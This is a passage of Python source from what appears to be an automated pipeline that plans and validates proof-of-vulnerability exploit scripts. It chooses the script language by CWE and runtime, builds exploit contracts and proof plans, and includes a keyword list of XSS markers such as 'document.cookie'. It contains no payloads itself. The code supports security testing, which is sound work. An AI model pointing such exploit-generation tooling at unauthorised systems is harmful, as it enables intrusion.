        # Pattern: optional modifiers, return type, then the function name before '('.
        func_sig_re = re.compile(
            r'^\s*'
            r'(?:(?:static|inline|extern|const|volatile|unsigned|signed|struct|enum|union)\s+)*'
            r'(?:[A-Za-z_]\w*(?:\s*\*+)?\s+)+'
            r'([A-Za-z_]\w*)'
            r'\s*\(',
        )
        search_start = min(line_number - 1, len(lines) - 1)
        main_fallback = ''
        for i in range(search_start, max(search_start - 200, -1), -1):
            m = func_sig_re.match(lines[i])
            if m:
                name = m.group(1)
                if name.lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
                    if name == 'main':
                        main_fallback = 'main'
                        continue  # keep scanning; prefer a named function over main
                    return name
        return main_fallback


    def _is_dom_browser_finding(self, cwe_type: str, vulnerable_code: str, explanation: str, filepath: str = '') -> bool:
        combined = ' '.join([str(cwe_type or ''), str(vulnerable_code or ''), str(explanation or ''), str(filepath or '')]).lower()
        dom_markers = [
            'cwe-79', 'innerhtml', 'outerhtml', 'document.write', 'onerror=', 'onload=',
            '<script', 'javascript:', 'document.cookie', 'window.location', 'settimeout(', 'setinterval(',
        ]
        return any(marker in combined for marker in dom_markers)

    def _select_pov_language(
        self,
        contract_runtime: str,
        cwe_type: str,
        exploit_contract: Optional[Dict[str, Any]],
        explanation: str = '',
        vulnerable_code: str = '',
    ) -> str:
        """Select the best PoV scripting language for a given exploit.

        The guiding principle: choose the language that makes the exploit *actually
        trigger* in the harness container, not the language the target is written in.

        Decision tree per runtime family
        ─────────────────────────────────
        native (C/C++)
          Always Python. The harness invokes the ASan-instrumented binary via
          subprocess. The proof container always has python3.

        javascript / node / typescript
          Python by default (subprocess / requests is simpler and more reliable).
          JavaScript only when the exploit *requires* the V8 engine:
            - Prototype Pollution (CWE-1321) — must run Object.prototype mutation in V8
            - eval/code injection (CWE-94, CWE-95) — payload executes inside JS runtime
            - browser_dom surface — DOM manipulation requires a JS context

        java
          Python by default (HTTP requests to Spring/Jakarta, subprocess jar invocation).
          Java only when the exploit needs the JVM for in-process gadget construction:
            - Deserialization (CWE-502) — Java gadget chains require the real JVM
            - Reflection abuse (CWE-470) — setAccessible() is JVM-only

        php
          PHP by default (direct function-level testing, eval injection).
          Python when the exploit is HTTP-based (curl/requests against a web endpoint)
          and the contract surface is http_request.

        ruby
          Ruby by default (in-process method calls, deserialization).
          Python when the exploit is HTTP-based.

        go
          Python by default (subprocess invocation of compiled binary).
          Go only when the exploit needs the Go runtime:
            - Race conditions (CWE-362) — goroutines required
            - Unsafe memory (CWE-119, CWE-416) — unsafe pointer only in Go runtime

        python
          Always Python (trivially the same language as the target).

        browser
          Always JavaScript (DOM/XSS proofs run inside a headless browser JS context).

        Any other / unknown
          Python (most capable harness language, available in every proof container).
        """
        runtime = str(contract_runtime or '').lower()
        cwe = (cwe_type or '').strip().upper()
        contract = exploit_contract or {}
        plan = contract.get('proof_plan') or {}
        surface = str(
            contract.get('execution_surface') or plan.get('execution_surface') or ''
        ).lower()
        combined_text = ' '.join([
            str(contract.get('goal') or ''),
            str(explanation or ''),
            str(vulnerable_code or ''),
        ]).lower()

        # ── Browser / DOM always needs JS ──────────────────────────────────────
        if runtime == 'browser' or surface == 'browser_dom':
            return 'javascript'

        # ── Native C/C++ — Python subprocess drives the ASan binary ───────────
        if runtime in {'c', 'cpp', 'native', 'binary'}:
            return 'python'

        # ── JavaScript / Node / TypeScript ─────────────────────────────────────
        if runtime in {'javascript', 'node', 'typescript', 'web'}:
            _inprocess_js = {
                'CWE-1321',  # Prototype Pollution
                'CWE-94',    # Code Injection
                'CWE-95',    # eval Injection
            }
            if cwe in _inprocess_js:
                return 'javascript'
            return 'python'

        # ── Java ───────────────────────────────────────────────────────────────
        if runtime == 'java':
            _inprocess_java = {
                'CWE-502',   # Deserialization — gadget chain needs JVM
                'CWE-470',   # Reflection abuse — setAccessible needs JVM
                'CWE-611',   # XXE — Java XML parser in same JVM process
            }
            if cwe in _inprocess_java:
                return 'java'
            return 'python'

        # ── PHP ────────────────────────────────────────────────────────────────
        if runtime == 'php':
            # HTTP-based exploits (web endpoints) are easier with Python requests.
            # In-process PHP exploits (eval, unserialize, file inclusion) use PHP directly.
            _inprocess_php = {
                'CWE-94',    # eval injection
                'CWE-95',    # preg_replace /e
                'CWE-502',   # unserialize gadget
                'CWE-98',    # Remote file inclusion
                'CWE-73',    # External control of file name / LFI
            }
            if cwe in _inprocess_php or surface not in {'http_request', 'browser_dom'}:
                return 'php'
            return 'python'

        # ── Ruby ───────────────────────────────────────────────────────────────
        if runtime == 'ruby':
            _inprocess_ruby = {
                'CWE-502',   # Marshal.load deserialization
                'CWE-94',    # eval injection
                'CWE-95',    # instance_eval / class_eval injection
            }
            if cwe in _inprocess_ruby or surface not in {'http_request', 'browser_dom'}:
                return 'ruby'
            return 'python'

        # ── Go ─────────────────────────────────────────────────────────────────
        if runtime in {'go', 'golang'}:
            _inprocess_go = {
                'CWE-362',   # Race condition — goroutines required
                'CWE-119',   # Memory safety via unsafe package
                'CWE-416',   # Use-after-free via unsafe pointer
                'CWE-190',   # Integer overflow in Go arithmetic
            }
            if cwe in _inprocess_go:
                return 'go'
            return 'python'

        # ── Python target — always Python PoV ──────────────────────────────────
        if runtime == 'python':
            return 'python'

        # ── HTTP / live-app surface — Python requests is the best harness ──────
        if surface in {'http_request', 'live_app'} or runtime in {'web', 'http'}:
            return 'python'

        # ── Unknown / fallback — Python is available in every proof container ──
        return 'python'

    def _contract_runtime_consistency_issues(self, pov_script: str, exploit_contract: Optional[Dict[str, Any]], filepath: str, cwe_type: str, vulnerable_code: str = '') -> List[str]:
        contract = exploit_contract or {}
        plan = contract.get('proof_plan') or {}
        runtime_profile = str(contract.get('runtime_profile') or self._infer_runtime_profile_from_filepath(filepath) or '').lower()
        runtime_family = str(plan.get('runtime_family') or runtime_profile or '').lower()
        execution_surface = str(plan.get('execution_surface') or '').lower()
        target_entrypoint = str(contract.get('target_entrypoint') or '').strip().lower()
        target_url = str(contract.get('target_url') or contract.get('base_url') or '').strip().lower()
        script_runtime = self._infer_pov_script_runtime(pov_script)
        issues: List[str] = []

        # Validate PoV language matches what _select_pov_language would choose.
        # This is the consistency gate — if the model produced a different language than
        # the selector would pick, flag it for regeneration with the correct instruction.
        _expected_pov_lang = self._select_pov_language(
            contract_runtime=runtime_profile,
            cwe_type=cwe_type,
            exploit_contract=contract,
            vulnerable_code=vulnerable_code,
        )
        _script_lang_map = {
            'python': 'python',
            'node': 'javascript',
            'javascript': 'javascript',
            'php': 'php',
            'ruby': 'ruby',
            'go': 'go',
            'shell': 'shell',
            'java': 'java',
        }
        _actual_pov_lang = _script_lang_map.get(script_runtime, 'python')
        if _actual_pov_lang != _expected_pov_lang:
            issues.append(
                f'PoV language mismatch: expected {_expected_pov_lang} for this exploit type '
                f'(CWE={cwe_type}, runtime={runtime_profile}, surface={execution_surface}) '
                f'but got {_actual_pov_lang}. Regenerate in {_expected_pov_lang}.'
            )
        if runtime_profile in {'browser'} and re.search(r'(^|\n)\s*import\s+requests\b', pov_script or ''):
            issues.append('Browser/DOM PoV uses Python requests instead of a JavaScript/browser harness')
        binary_candidates = [str(x).strip() for x in self._coerce_listish(plan.get('binary_candidates')) if str(x).strip()]
        requires_explicit_entrypoint = execution_surface == 'function_call'
        requires_explicit_route = execution_surface == 'http_request'
        if requires_explicit_entrypoint and target_entrypoint in {'', 'unknown', 'none', 'n/a'} and not target_url:
            issues.append('Exploit contract is missing a concrete target entrypoint or route for the next proof stage')
        if execution_surface == 'binary_cli' and target_entrypoint in {'', 'unknown', 'none', 'n/a'} and not binary_candidates:
            issues.append('Native proof plan is missing a concrete binary or entrypoint for the next proof stage')
        if requires_explicit_route and not target_url:
            issues.append('HTTP proof plan is missing a concrete target URL or route for the next proof stage')
        if self._is_dom_browser_finding(cwe_type, vulnerable_code, contract.get('goal') or '', filepath) and runtime_family in {'javascript', 'node', 'browser'} and execution_surface == 'repo_script':
            issues.append('DOM/XSS finding is routed as a repo script instead of a browser-oriented proof path')
        return issues

    def _canonicalize_target_entrypoint(
        self,
        value: Any,
        vulnerable_code: str,
        explanation: str,
        filepath: str,
        runtime_profile: str = '',
        codebase_path: str = '',
        line_number: int = 0,
        source: str = '',
    ) -> str:
        """Resolve the target entrypoint for the exploit contract.

        For CodeQL findings (source=='codeql'), the enclosing function is extracted
        deterministically from the source file rather than being hallucinated by an LLM.
        A placeholder value like 'unknown' or 'vulnerable_binary' from the model is
        always overridden when a static extraction succeeds.
        """
        candidate = str(value or '').strip()
        is_placeholder = not candidate or candidate.lower() in {
            'unknown', 'vulnerable_binary', 'none', 'n/a', '',
        }

        # For CodeQL findings, always attempt deterministic static extraction first.
        # This overrides whatever the LLM returned, even if it looks non-placeholder,
        # because CodeQL tells us exactly which function the finding is in.
        if source == 'codeql' and codebase_path and filepath and line_number:
            ext = Path(filepath or '').suffix.lower()
            if ext in {'.c', '.h', '.cc', '.cpp', '.cxx', '.hpp'}:
                static_name = self._static_extract_enclosing_function(codebase_path, filepath, line_number)
                if static_name and static_name.lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
                    return static_name

        if is_placeholder:
            inferred = self._extract_target_entrypoint(vulnerable_code or explanation, filepath)
            if inferred and inferred != 'unknown':
                return inferred
            # Last resort: mine backtick-quoted function names from the explanation.
            # Handles cases like CWE-787 where the code chunk is a variable-declaration
            # block without a function signature, but the explanation mentions the function.
            bt_match = re.search(r'`([A-Za-z_]\w*)\s*\(', str(explanation or ''))
            if bt_match and bt_match.group(1).lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
                return bt_match.group(1)
            return inferred
        if candidate.startswith('/') or candidate.startswith('http://') or candidate.startswith('https://'):
            return candidate
        if runtime_profile in {'c', 'cpp', 'native', 'binary'}:
            lowered = candidate.lower()
            if lowered.startswith('the ') and 'main-like entrypoint' in lowered:
                return 'main'
            if re.fullmatch(r'[A-Za-z_]\w*', candidate):
                return candidate if lowered not in self.NATIVE_INVALID_ENTRYPOINTS else 'unknown'
            if re.fullmatch(r'[A-Za-z_]\w*\s*\([^\)]*\)', candidate):
                match = re.match(r'([A-Za-z_]\w*)\s*\(', candidate)
                if match:
                    symbol = match.group(1)
                    if symbol.lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
                        return symbol
            backticked = re.search(r'`([A-Za-z_]\w*)\s*\(', candidate)
            if backticked and backticked.group(1).lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
                return backticked.group(1)
            inferred = self._extract_target_entrypoint(vulnerable_code or explanation, filepath)
            if inferred and inferred.lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
                return inferred
            return 'unknown'
        if re.fullmatch(r'[A-Za-z_]\w*', candidate):
            return candidate
        match = re.search(r'([A-Za-z_]\w*)\s*\([^\)]*\)', candidate)
        if match:
            return match.group(1)
        # For verbose multi-word descriptions (common in JS investigator output), extract
        # the first backtick-quoted or camelCase/function identifier from the description.
        backtick_match = re.search(r'`([A-Za-z_]\w*)`', candidate)
        if backtick_match and backtick_match.group(1).lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
            return backtick_match.group(1)
        # Extract first camelCase or plain identifier from verbose description
        first_id_match = re.search(r'\b([a-z][A-Za-z0-9_]{2,})\b', candidate)
        if first_id_match and first_id_match.group(1).lower() not in self.NATIVE_INVALID_ENTRYPOINTS:
            return first_id_match.group(1)
        return candidate

    def _default_proof_plan(self, cwe_type: str, filepath: str, target_entrypoint: str, runtime_profile: str, inputs: List[Any]) -> Dict[str, Any]:
        ext = Path(filepath or '').suffix.lower()
        runtime = (runtime_profile or self._infer_runtime_profile_from_filepath(filepath) or '').lower()
        runtime_family = runtime or 'unknown'
        execution_surface = 'repo_script'
        input_mode = 'argv'
        input_format = 'text'
        oracle = ['stdout_marker']
        has_concrete_entrypoint = str(target_entrypoint or '').strip().lower() not in {'', 'unknown', 'none', 'n/a'}
        preflight_checks = ['target_entrypoint_resolves'] if has_concrete_entrypoint else []
        binary_candidates: List[str] = []

        if runtime in {'c', 'cpp', 'native', 'binary'}:
            runtime_family = 'native'
            execution_surface = 'binary_cli'
            input_mode = 'argv'
            input_format = 'text'
            oracle = ['crash_signal', 'sanitizer_output', 'stdout_marker']
            preflight_checks = ['binary_exists', 'baseline_execution_succeeds'] + (['target_entrypoint_resolves'] if has_concrete_entrypoint else [])
            lowered_entry = str(target_entrypoint or '').lower()
            if any(token in lowered_entry for token in ['mqjs', 'qjs', 'load', 'js_load']) or 'javascript' in ' '.join(map(str, inputs)).lower():
                input_mode = 'file'
                input_format = 'javascript'
            elif ext in {'.c', '.cc', '.cpp', '.cxx'} and cwe_type in {'CWE-120', 'CWE-121', 'CWE-122'}:
                input_mode = 'argv'
                input_format = 'text'
            binary_candidates = []
            observed_inputs = ' '.join(str(x) for x in inputs).lower()
            file_path_signals = ' '.join([filepath or '', target_entrypoint or '', observed_inputs]).lower()
            if any(token in observed_inputs for token in ['javascript file', 'js file', 'load(', '.js', 'script file']) or any(token in file_path_signals for token in ['load_file', 'fopen', 'open(', 'filename', 'filepath', 'parse_file', 'readfile']):
                input_mode = 'file'
                input_format = 'javascript' if any(token in file_path_signals for token in ['js', 'javascript', 'mqjs', 'qjs', 'load_file']) else 'text'
            if any('mqjs' in x.lower() or 'qjs' in x.lower() for x in binary_candidates) or 'mqjs' in lowered_entry or 'qjs' in lowered_entry:
                binary_candidates.extend(['mqjs', 'mquickjs', 'qjs'])
        elif runtime in {'javascript', 'node', 'typescript'}:
            if self._is_dom_browser_finding(cwe_type, '', '', filepath):
                runtime_family = 'browser'
                execution_surface = 'browser_dom'
                input_mode = 'request'
                input_format = 'javascript'
                oracle = ['dom_execution', 'response_marker', 'behavioral_assertion']
                preflight_checks = ['finding_file_exists']
            else:
                runtime_family = 'node'
                execution_surface = 'repo_script'
                input_mode = 'function'
                input_format = 'javascript'
                oracle = ['stdout_marker', 'exception', 'behavioral_assertion']
                preflight_checks = ['module_importable'] + (['target_entrypoint_resolves'] if has_concrete_entrypoint else [])
        elif runtime == 'python':
            runtime_family = 'python'
            execution_surface = 'repo_script'
            input_mode = 'function'
            input_format = 'python'
            oracle = ['stdout_marker', 'exception', 'behavioral_assertion']
            preflight_checks = ['module_importable'] + (['target_entrypoint_resolves'] if has_concrete_entrypoint else [])
        elif runtime == 'java':
            runtime_family = 'java'
            execution_surface = 'repo_script'
            input_mode = 'function'
            input_format = 'java'
            oracle = ['stdout_marker', 'exception', 'behavioral_assertion']
            preflight_checks = ['classpath_resolves'] + (['target_entrypoint_resolves'] if has_concrete_entrypoint else [])
        elif runtime in {'web', 'http', 'browser'} or str(target_entrypoint or '').startswith('/'):
            runtime_family = 'web'
            execution_surface = 'http_request'
            input_mode = 'request'
            input_format = 'http'
            oracle = ['http_effect', 'response_marker', 'dom_execution']
            preflight_checks = ['target_reachable', 'route_exists']

        candidate_input_modes = [input_mode]
        if runtime_family == 'native':
            if input_mode == 'file':
                candidate_input_modes.extend(['stdin', 'eval', 'argv'])
            elif input_mode == 'stdin':
                candidate_input_modes.extend(['file', 'eval', 'argv'])
            elif input_mode == 'eval':
                candidate_input_modes.extend(['file', 'stdin', 'argv'])
            else:
                candidate_input_modes.extend(['file', 'stdin', 'eval'])

        return {
            'runtime_family': runtime_family,
            'execution_surface': execution_surface,
            'input_mode': input_mode,
            'input_format': input_format,
            'oracle': oracle,
            'preflight_checks': preflight_checks,
            'binary_candidates': list(dict.fromkeys([x for x in binary_candidates if x])),
            'candidate_input_modes': list(dict.fromkeys([x for x in candidate_input_modes if x])),
            'fallback_strategies': ['adjust_payload', 'retry_with_alternate_target'],
        }

    def _normalize_proof_plan(self, plan: Optional[Dict[str, Any]], cwe_type: str, filepath: str, target_entrypoint: str, runtime_profile: str, inputs: List[Any]) -> Dict[str, Any]:
        default_plan = self._default_proof_plan(cwe_type, filepath, target_entrypoint, runtime_profile, inputs)
        merged = dict(default_plan)
        if isinstance(plan, dict):
            for key, value in plan.items():
                if value not in (None, '', [], {}):
                    merged[key] = value
        if isinstance(merged.get('oracle'), str):
            merged['oracle'] = [merged['oracle']]
        if isinstance(merged.get('preflight_checks'), str):
            merged['preflight_checks'] = [merged['preflight_checks']]
        if isinstance(merged.get('fallback_strategies'), str):
            merged['fallback_strategies'] = [merged['fallback_strategies']]
        if isinstance(merged.get('binary_candidates'), str):
            merged['binary_candidates'] = [merged['binary_candidates']]
        if isinstance(merged.get('candidate_input_modes'), str):
            merged['candidate_input_modes'] = [merged['candidate_input_modes']]
        merged['runtime_family'] = str(merged.get('runtime_family') or default_plan['runtime_family']).lower()
        merged['execution_surface'] = str(merged.get('execution_surface') or default_plan['execution_surface']).lower()
        merged['input_mode'] = str(merged.get('input_mode') or default_plan['input_mode']).lower()
        merged['input_format'] = str(merged.get('input_format') or default_plan['input_format']).lower()
        merged['oracle'] = [str(x) for x in (merged.get('oracle') or default_plan['oracle']) if str(x).strip()]
        merged['preflight_checks'] = [str(x) for x in (merged.get('preflight_checks') or default_plan['preflight_checks']) if str(x).strip()]
        merged['fallback_strategies'] = [str(x) for x in (merged.get('fallback_strategies') or default_plan['fallback_strategies']) if str(x).strip()]
        merged['binary_candidates'] = list(dict.fromkeys(str(x) for x in (merged.get('binary_candidates') or default_plan['binary_candidates']) if str(x).strip()))
        merged['candidate_input_modes'] = list(dict.fromkeys(str(x).lower() for x in (merged.get('candidate_input_modes') or default_plan.get('candidate_input_modes') or [merged['input_mode']]) if str(x).strip()))
        if merged['input_mode'] not in merged['candidate_input_modes']:
            merged['candidate_input_modes'].insert(0, merged['input_mode'])
        return merged

    def _default_exploit_contract(self, cwe_type: str, explanation: str, vulnerable_code: str, filepath: str = '') -> Dict[str, Any]:
        inferred_runtime = self._infer_runtime_profile_from_filepath(filepath)
        runtime_profile = 'browser' if self._is_dom_browser_finding(cwe_type, vulnerable_code, explanation, filepath) and inferred_runtime in {'javascript', 'node', 'typescript'} else inferred_runtime
        target_entrypoint = self._extract_target_entrypoint(vulnerable_code, filepath)
        inputs = []
        trigger_steps = ['Invoke the vulnerable code path with attacker-controlled input']
        if cwe_type in {'CWE-120', 'CWE-121', 'CWE-122'}:
            inputs = ['oversized input string', 'undersized destination buffer']
            trigger_steps = [f'Call {target_entrypoint} with an input longer than the destination buffer', 'Observe memory corruption, crash, or sanitizer evidence']
        elif cwe_type == 'CWE-690':
            inputs = ['resource-constrained memory limit', 'oversized allocation request']
            trigger_steps = [f'Reach {target_entrypoint} with an attacker-controlled size or allocation parameter', 'Force allocation failure deterministically and observe NULL dereference or crash']
        elif cwe_type == 'CWE-476':
            inputs = ['crafted input that causes a missing or NULL value on the vulnerable path']
            trigger_steps = [f'Reach {target_entrypoint} with attacker-controlled input', 'Observe null dereference, crash, or sanitizer evidence']
        return {
            'goal': explanation or 'Demonstrate exploitability of the candidate vulnerability',
            'target_entrypoint': target_entrypoint,
            'runtime_profile': runtime_profile,
            'http_method': 'GET',
            'target_url': '',
            'base_url': '',
            'preconditions': [],
            'inputs': inputs,
            'trigger_steps': trigger_steps,
            'success_indicators': ['VULNERABILITY TRIGGERED'],
            'side_effects': [],
            'expected_outcome': 'The exploit should trigger observable unsafe behavior',
            'proof_plan': self._default_proof_plan(cwe_type, filepath, target_entrypoint, runtime_profile, inputs),
        }

    def _normalize_exploit_contract(
        self,
        contract: Optional[Dict[str, Any]],
        cwe_type: str,
        explanation: str,
        vulnerable_code: str,
        filepath: str = '',
        codebase_path: str = '',
        line_number: int = 0,
        source: str = '',
    ) -> Dict[str, Any]:
        defaults = self._default_exploit_contract(cwe_type, explanation, vulnerable_code, filepath=filepath)
        merged = dict(defaults)
        if isinstance(contract, dict):
            for key, value in contract.items():
                if value not in (None, '', [], {}):
                    merged[key] = value
        if not merged.get('runtime_profile'):
            merged['runtime_profile'] = defaults.get('runtime_profile', '')
        merged['target_entrypoint'] = self._canonicalize_target_entrypoint(
            merged.get('target_entrypoint'),
            vulnerable_code,
            explanation,
            filepath,
            runtime_profile=merged.get('runtime_profile', ''),
            codebase_path=codebase_path,
            line_number=line_number,
            source=source,
        )
        # Build/refresh entrypoint_candidates from code + probe data.
        # Always regenerated so the list reflects the latest probe_binary_name.
        # Existing candidates in the contract (from a prior retry) are preserved
        # at the front so the caller's promotion logic is not reset.
        _probe_bin_for_ep = str(merged.get('probe_binary_name') or '').strip()
        _fresh_candidates = self._extract_target_entrypoint_candidates(
            vulnerable_code, filepath, probe_binary_name=_probe_bin_for_ep
        )
        _existing_candidates = [str(x).strip() for x in self._coerce_listish(
            merged.get('entrypoint_candidates')
        ) if str(x).strip()]
        # Merge: existing (already promoted) first, then any new ones not yet seen
        _merged_candidates = list(dict.fromkeys([*_existing_candidates, *_fresh_candidates]))
        merged['entrypoint_candidates'] = _merged_candidates
        # If the canonical entrypoint resolved to 'unknown', promote the first
        # candidate (probe binary name or first AST extraction) so the finding
        # can still pass the contract gate and attempt PoV generation.
        _ep = str(merged.get('target_entrypoint') or '').strip().lower()
        if _ep in {'', 'unknown', 'none', 'n/a'} and _merged_candidates:
            merged['target_entrypoint'] = _merged_candidates[0]
        merged['success_indicators'] = [str(x) for x in self._coerce_listish(merged.get('success_indicators') or defaults.get('success_indicators', ['VULNERABILITY TRIGGERED'])) if str(x).strip()]
        merged['trigger_steps'] = [str(x) for x in self._coerce_listish(merged.get('trigger_steps') or defaults.get('trigger_steps', [])) if str(x).strip()]
        merged['inputs'] = [str(x) for x in self._coerce_listish(merged.get('inputs') or defaults.get('inputs', [])) if str(x).strip()]
        merged['side_effects'] = [str(x) for x in self._coerce_listish(merged.get('side_effects') or []) if str(x).strip()]
        merged['preconditions'] = [str(x) for x in self._coerce_listish(merged.get('preconditions') or []) if str(x).strip()]
        if merged.get('runtime_profile') in {'c', 'cpp', 'native', 'binary'}:
            native_indicators = [
                'VULNERABILITY TRIGGERED',
                'AddressSanitizer',
                'UndefinedBehaviorSanitizer',
                'Segmentation fault',
                'SIGSEGV',
            ]
            merged['success_indicators'] = list(dict.fromkeys([*merged['success_indicators'], *native_indicators]))
        explicit_plan = contract.get('proof_plan') if isinstance(contract, dict) else {}
        merged['proof_plan'] = self._normalize_proof_plan(
            explicit_plan or {},
            cwe_type,
            filepath,
            merged.get('target_entrypoint', ''),
            merged.get('runtime_profile', ''),
            merged.get('inputs', []) or [],
        )

        runtime_feedback = self._flatten_runtime_feedback((merged.get('runtime_feedback') if isinstance(merged.get('runtime_feedback'), dict) else {}) or {})
        if runtime_feedback:
            observed_binary = str(runtime_feedback.get('target_binary') or '').strip()
            recommended_input_mode = str(runtime_feedback.get('recommended_input_mode') or '').strip().lower()
            supported_input_modes = [str(x).strip().lower() for x in self._coerce_listish(runtime_feedback.get('supported_input_modes')) if str(x).strip()]
            observed_surface = runtime_feedback.get('observed_surface') or runtime_feedback.get('surface') or {}
            plan = dict(merged.get('proof_plan') or {})

            if observed_binary:
                binary_hint = Path(observed_binary).name
                existing_candidates = [str(x) for x in self._coerce_listish(plan.get('binary_candidates')) if str(x).strip()]
                plan['binary_candidates'] = list(dict.fromkeys([binary_hint, observed_binary, *existing_candidates]))

            if recommended_input_mode:
                current_input_mode = str(plan.get('input_mode') or '').strip().lower()
                if current_input_mode != recommended_input_mode and (not supported_input_modes or current_input_mode not in supported_input_modes):
                    plan['input_mode'] = recommended_input_mode
                candidate_input_modes = [str(x).strip().lower() for x in self._coerce_listish(plan.get('candidate_input_modes')) if str(x).strip()]
                plan['candidate_input_modes'] = list(dict.fromkeys([recommended_input_mode, *supported_input_modes, *candidate_input_modes]))

            if isinstance(observed_surface, dict) and plan.get('execution_surface') == 'binary_cli':
                if not observed_surface.get('supports_positional_file') and not observed_surface.get('include_option') and not observed_surface.get('eval_option'):
                    if str(plan.get('input_mode') or '').lower() == 'file' and recommended_input_mode:
                        plan['input_mode'] = recommended_input_mode
                if observed_surface.get('eval_option') and str(plan.get('input_mode') or '').lower() == 'eval':
                    plan['candidate_input_modes'] = list(dict.fromkeys(['eval', *[str(x).strip().lower() for x in self._coerce_listish(plan.get('candidate_input_modes')) if str(x).strip()]]))

            merged['proof_plan'] = self._normalize_proof_plan(
                plan,
                cwe_type,
                filepath,
                merged.get('target_entrypoint', ''),
                merged.get('runtime_profile', ''),
                merged.get('inputs', []) or [],
            )

        if self._is_dom_browser_finding(cwe_type, vulnerable_code, explanation, filepath) and merged.get('runtime_profile') in {'javascript', 'node', 'typescript', 'browser', ''}:
            merged['runtime_profile'] = 'browser'
            merged['browser_required'] = True
            merged['client_side'] = True
            plan = dict(merged.get('proof_plan') or {})
            plan['runtime_family'] = 'browser'
            plan['execution_surface'] = 'browser_dom'
            has_target_url = bool(str(merged.get('target_url') or merged.get('base_url') or '').strip())
            plan['input_mode'] = 'request' if has_target_url else 'function'
            plan['input_format'] = 'javascript'
            plan['oracle'] = list(dict.fromkeys([*(plan.get('oracle') or []), 'dom_execution', 'response_marker']))
            plan['candidate_input_modes'] = ['function', 'request']
            if has_target_url:
                plan['preflight_checks'] = [x for x in ['finding_file_exists', 'target_reachable', 'route_exists', *(plan.get('preflight_checks') or [])] if x]
            else:
                plan['preflight_checks'] = [x for x in ['finding_file_exists', *(plan.get('preflight_checks') or [])] if x not in {'target_reachable', 'route_exists'}]
            if str(merged.get('target_entrypoint') or '').strip().lower() in {'', 'unknown', 'none', 'n/a'}:
                merged['target_entrypoint'] = f"dom_sink_in:{Path(filepath or '').name or 'client_script'}"
            merged['proof_plan'] = plan

        # -- Promote concrete binary anchor -> contract.target_binary (priority order)
        # Priority: preflight-observed > binary_candidates[0] > existing value.
        # Only for native families; never promote source files or placeholders.
        if merged.get('runtime_profile') in {'c', 'cpp', 'native', 'binary'}:
            _invalid = {'', 'unknown', 'none', 'n/a'}
            tb = str(merged.get('target_binary') or '').strip()
            tb_is_weak = not tb or tb.lower() in _invalid
            if tb_is_weak:
                # 1. Preflight-observed binary (most concrete)
                rf_inner = self._flatten_runtime_feedback(
                    (merged.get('runtime_feedback') or {})
                    if isinstance(merged.get('runtime_feedback'), dict) else {}
                )
                observed_bin = str(
                    rf_inner.get('target_binary') or rf_inner.get('observed_target_binary') or ''
                ).strip()
                if (
                    observed_bin
                    and observed_bin.lower() not in _invalid
                    and self._binary_like_target(observed_bin, filepath=filepath, target_entrypoint=merged.get('target_entrypoint') or '')
                ):
                    merged['target_binary'] = observed_bin
                else:
                    # 2. First non-source, non-placeholder binary_candidates entry
                    candidates = [
                        str(x).strip()
                        for x in self._coerce_listish(
                            (merged.get('proof_plan') or {}).get('binary_candidates')
                        )
                        if str(x).strip()
                        and str(x).strip().lower() not in _invalid
                        and self._binary_like_target(
                            str(x),
                            filepath=filepath,
                            target_entrypoint=merged.get('target_entrypoint') or '',
                        )
                    ]
                    if candidates:
                        merged['target_binary'] = candidates[0]

        # -- Persist known_subcommands as a first-class contract field.
        # Both _validate_proof_plan and the scaffold prompt read from here.
        if not merged.get('known_subcommands'):
            _subcommands = self._extract_subcommands_from_surface(
                merged.get('runtime_feedback') or {}
            )
            if _subcommands:
                merged['known_subcommands'] = _subcommands
                _plan = dict(merged.get('proof_plan') or {})
                _plan['observed_subcommands'] = _subcommands
                merged['proof_plan'] = _plan

        # -- Native function-harness normalization.
        # When the target_entrypoint is an internal C symbol (not a CLI subcommand),
        # flip execution_surface to function_call / function_harness and rebound
        # proof_plan.target_entrypoint to the resolved symbol.  Also drop any stale
        # CLI-only plan fields that the model may have carried over from a prior
        # binary_cli round.
        if merged.get('runtime_profile') in {'c', 'cpp', 'native', 'binary'}:
            _known_subcommands = [
                str(s).strip().lower()
                for s in self._coerce_listish(merged.get('known_subcommands'))
                if str(s).strip()
            ]
            _native_plan = dict(merged.get('proof_plan') or {})
            _plan_surface = str(_native_plan.get('execution_surface') or '').lower()

            # -- Offline-model surface correction (repo-independent).
            # Offline models frequently emit execution_surface=function_call or
            # function_harness for compiled CLI binaries (C/C++/Go/Rust) because they
            # pattern-match on the C function name rather than the binary invocation
            # model.  Correct this to binary_cli when:
            #   1. The plan declares function_call or function_harness, AND
            #   2. There is binary evidence: binary_candidates list is non-empty, OR
            #      target_binary is set and does NOT look like a Python/JS identifier
            #      (i.e. does not end in .py/.js or contain parens/lambda), AND
            #   3. known_subcommands is non-empty (confirms it's a CLI binary).
            # This runs before the entrypoint-based dispatch below so that the
            # subcommand resolver sees 'binary_cli' as the starting surface.
            if _plan_surface in {'function_call', 'function_harness'}:
                _binary_candidates = [
                    str(x).strip()
                    for x in self._coerce_listish(_native_plan.get('binary_candidates'))
                    if str(x).strip()
                ]
                _tb = str(merged.get('target_binary') or '').strip()
                _tb_is_script = bool(
                    _tb and (
                        _tb.endswith('.py') or _tb.endswith('.js') or _tb.endswith('.ts')
                        or '(' in _tb or 'lambda' in _tb.lower()
                    )
                )
                _has_binary_evidence = bool(_binary_candidates) or (
                    bool(_tb) and not _tb_is_script
                )
                if _has_binary_evidence and _known_subcommands:
                    # Correct offline model's misclassification
                    _plan_surface = 'binary_cli'
                    _native_plan['execution_surface'] = 'binary_cli'
                    if str(_native_plan.get('input_mode') or '').lower() in {'function', ''}:
                        _native_plan['input_mode'] = 'argv'
                    if str(_native_plan.get('input_format') or '').lower() in {'c', 'cpp', 'function'}:
                        _native_plan['input_format'] = 'text'
                    merged['execution_surface'] = 'binary_cli'

            # known subcommand, set the explicit subcommand hint on the plan.
            if _plan_surface in {'binary_cli', 'cli', ''} and _known_subcommands:
                _resolved_sub = self._infer_native_cli_subcommand(
                    merged.get('target_entrypoint') or '', _known_subcommands
                )
                if _resolved_sub:
                    _native_plan['subcommand'] = _resolved_sub
                    _native_plan['execution_surface'] = 'binary_cli'
                    if str(_native_plan.get('input_mode') or '').lower() == 'function':
                        _native_plan['input_mode'] = 'argv'
